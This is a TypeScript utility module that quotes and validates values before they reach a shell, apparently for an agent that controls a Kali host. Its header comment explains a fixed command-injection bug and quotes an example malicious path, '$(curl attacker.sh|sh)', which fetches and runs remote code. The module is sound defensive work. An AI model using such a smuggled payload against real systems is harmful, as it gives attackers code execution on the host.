/**
 * Ops · Shell quoting — the one place that turns a value into a safe shell word
 * ────────────────────────────────────────────────────────────────────────────────
 * Why this file exists
 * ────────────────────
 * The Kali terminal, the file tools and the process runner all built commands by
 * string interpolation:
 *
 *     const cmd = `cat "${p.replace(/"/g, '\\"')}" 2>&1`;
 *
 * Escaping only `"` is not enough. Inside double quotes bash still expands
 * `$(...)`, backticks, `${...}` and `\`, so a "path" of
 *
 *     $(curl attacker.sh|sh)
 *
 * executed on the connected Kali box. The same pattern appeared in
 * `buildSessionCommand` (env exports + `cd`), in `write_file` (heredoc body) and
 * in the process runner's `cwd`. That is CWE-78 command injection with the
 * attacker's payload running as the agent user — on a machine that is, by
 * design, the most privileged thing in the fleet.
 *
 * The fix is not "escape harder". It is to stop building shell strings out of
 * untrusted values: every value that reaches a shell goes through `shq()`,
 * which produces a single-quoted word. Inside single quotes bash expands
 * nothing at all — no `$`, no backtick, no `\` — so the only character that
 * needs care is `'` itself, which is closed, escaped and reopened.
 *
 * `shq("a'b")` → `'a'\''b'`
 *
 * This is the POSIX-portable form (works in sh, bash, dash, zsh, busybox ash),
 * which matters because the agent may be running any of them.
 */

/** Quote one value as a single POSIX shell word. Never returns an empty string. */
export function shq(value: unknown): string {
  const s = value === null || value === undefined ? "" : String(value);
  // '' for the empty string: an unquoted empty word would vanish from argv.
  return `'${s.replace(/'/g, `'\\''`)}'`;
}

/** Quote a value for use as a single-quoted heredoc delimiter body. */
export function heredocBody(value: unknown): string {
  // A quoted heredoc (<<'EOF') performs no expansion, so the body is literal.
  // The only hazard is a line that is exactly the delimiter; we pick a
  // delimiter that cannot appear in the payload.
  const s = value === null || value === undefined ? "" : String(value);
  let delim = "NOVA_EOF";
  let n = 0;
  while (s.split("\n").some((line) => line.trim() === delim)) {
    n += 1;
    delim = `NOVA_EOF_${n}`;
  }
  return `<<'${delim}'\n${s}\n${delim}`;
}

/**
 * Validate a value that is going to be used as a *path* on the remote host.
 * Rejects NUL bytes and newlines (which can break out of a quoted word in some
 * shells and always break the heredoc form). Absolute paths are allowed on
 * purpose — the agent is a full-control agent and the operator may legitimately
 * want /etc/hosts — but the value is still quoted, so it cannot become code.
 */
export function assertSafePath(p: unknown): string {
  const s = p === null || p === undefined ? "" : String(p);
  if (s.length === 0) throw new Error("empty path");
  if (s.includes("\0")) throw new Error("path contains NUL byte");
  if (s.includes("\n") || s.includes("\r")) throw new Error("path contains a newline");
  return s;
}

/**
 * Validate a value used as a *session id* / *conversation id*. These end up in
 * Map keys and in log lines, and a caller-supplied id used to be able to grow
 * the session map without bound. Restricting the alphabet keeps them safe to
 * echo and safe to use as filenames if that ever happens.
 */
export function assertSafeId(id: unknown, fallback = "default"): string {
  const s = id === null || id === undefined ? "" : String(id);
  if (!s) return fallback;
  if (!/^[A-Za-z0-9._:-]{1,128}$/.test(s)) {
    throw new Error("invalid id: only [A-Za-z0-9._:-] up to 128 chars are allowed");
  }
  return s;
}

/**
 * Validate a value used as an environment variable *name*. `export ${k}=...`
 * with an attacker-controlled `k` is another injection point.
 */
export function assertEnvName(name: unknown): string {
  const s = name === null || name === undefined ? "" : String(name);
  if (!/^[A-Za-z_][A-Za-z0-9_]{0,63}$/.test(s)) {
    throw new Error(`invalid environment variable name: ${s.slice(0, 40)}`);
  }
  return s;
}
